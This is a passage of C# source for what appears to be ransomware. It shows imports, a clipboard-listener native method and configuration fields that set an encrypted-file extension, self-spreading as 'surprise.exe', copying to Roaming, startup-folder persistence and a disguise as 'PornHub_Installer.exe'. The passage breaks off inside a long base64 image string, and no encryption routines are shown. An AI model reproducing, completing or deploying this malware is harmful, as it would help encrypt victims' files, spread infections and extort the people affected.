using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "PORN";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "PornHub_Installer.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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